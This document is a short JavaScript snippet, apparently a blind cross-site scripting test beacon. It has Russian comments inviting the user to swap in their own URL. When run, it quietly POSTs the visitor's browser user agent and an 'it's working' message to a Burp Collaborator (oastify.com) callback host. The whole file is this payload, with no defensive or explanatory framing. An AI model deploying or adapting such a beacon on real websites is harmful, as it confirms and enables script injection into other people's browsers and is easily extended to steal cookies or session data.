(function() {
  const url = "https://sa687idvvw70rktftydxluv9d0jr7rvg.oastify.com"; // 🔹 замени на нужный URL

  const data = {
    ua: navigator.userAgent,
    msg: "it's working"
  };

  fetch(url, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify(data)
  })
  .then(res => res.text())
  .then(resText => {
    console.log("Ответ сервера:", resText);
  })
  .catch(err => {
    console.error("Ошибка при отправке:", err);
  });
})();

